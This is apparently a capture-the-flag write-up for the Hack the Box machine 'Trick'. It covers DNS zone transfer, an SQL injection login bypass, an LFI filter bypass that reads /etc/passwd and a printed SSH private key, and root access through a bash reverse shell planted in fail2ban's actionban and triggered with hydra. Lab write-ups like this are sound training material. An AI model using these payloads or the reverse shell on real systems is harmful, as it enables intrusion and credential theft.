---
title: "Hack the Box - Trick"
slug: "hack-the-box-trick"
date: "2024-03-14"
excerpt: "Trick is an Easy Linux machine that features a DNS server and multiple vHost's that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using `sqlmap` we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial foothold we find a Sudo command that can be executed without a password. The command restarts the `fail2ban` service. The configuration directory of fail2ban contains a directory that is owned by a group that the current user is part of. The user has write access to the directory and can rename a configuration file and replace it with their own, which leads to Remote Code Execution as root once a ban is triggered."
cover: "cover.png"
tags:
  - LFI
  - RCE
  - SQLi
---

## Foothold
### NMAP
```bash
nmap -sC -sV -v T4 -oN scans/nmap.txt trick.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the NMAP scans it looks like there is a DNS (53) and mail (25) server running.

### DNS

I'll start by enumerating the DNS server for any interest records.

```bash
dig trick.htb
```

![](./20220710183001.png)  

DNS reverse lookup.

```bash
dig trick.htb axfr @trick.htb
```

![](./20220710184941.png)  

There's an interesting subdomain. Let's add it to `/etc/hosts`.

### Payroll Website
When we visit the website we get a login page.

![](./20220710183343.png)  

Let's try a simple SQLi payload `' OR 1=1-- -;` to test if the form is vulnerable to SQL Injection.

![](./20220710183504.png)  

When we submit the login form we get access to the Administrator account.

![](./20220710183535.png)  

If we head to the `Users` page we see a single Administrator user. If we try and edit the user we can actually see the user's username `Enemigosss` and the password `SuperGucciRainbowCake`.

![](./20220710183906.png)  

### Subdomain Fuzzing

There didn't seem to be anything else within the `preprod-payroll` website. Started trying to enumerate other subdomains.

Since it seems that the subdomains are prefixed with `preprod-`, I'll create a custom wordlist with this prefix.

```bash
sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt > preprod-wordlist.txt
```

```bash
gobuster vhost -u trick.htb -w ./preprod-wordlist.txt | tee scans/gobuster_vhost_preprod.txt 
```

![](./20220710202329.png)  

I'll add this to `/etc/hosts`.

### Marketing Website

![](./20220710203256.png)  

I noticed when navigating to other pages that it loads pages via a parameter.

![](./20220710203352.png)  

Unfortunately it has some form of LFI protection. I tried `..././` instead of `../../` and it worked.

```text
view-source:http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd
```

![](./20220710204015.png)  

From `/etc/hosts` we see a `michael` user.

```text
view-source:http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa
```

`michael` has a SSH private key we can use to SSH in.

![](./20220710204256.png)  

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

```bash
chmod 600 id_rsa

ssh michael@trick.htb -i id_rsa
```

![](./20220710204441.png)  

## Privilege Escalation

We can check our sudo privileges.

```bash
sudo -l
```

![](./20220710204933.png)  

According to this [article](https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server) the `iptables-multiport.conf` file is run when a user is banned.

![](./20220710205422.png)  

Let's modify this file and add a reverse shell in the `actionban` section. We'll use a normal bash TCP reverse shell.
```bash
/bin/bash -c "bash -i >& /dev/tcp/10.10.16.7/9001 0>&1"
```

![](./20220710215537.png)  

Because we can't write directly to the `iptables-multiport.conf` file, we'll create another file and then replace the existing one.

```bash
cp iptables-multiport.conf config.conf
mv config.conf iptables-multiport.conf
```

Then we restart the `fail2ban` service.

```bash
sudo /etc/init.d/fail2ban restart
```

![](./20220710210339.png)  

Now we can start our reverse shell listener.
```bash
rlwrap nc -lnvp 9001
```

We can trigger `fail2ban` using something that can make automated `ssh` requests such as `hydra`.

```bash
hydra trick.htb ssh -l root -P /usr/share/wordlists/rockyou.txt
```

After about 20-30 seconds we should get a callback on our shell and get root!

![](./20220710215850.png)  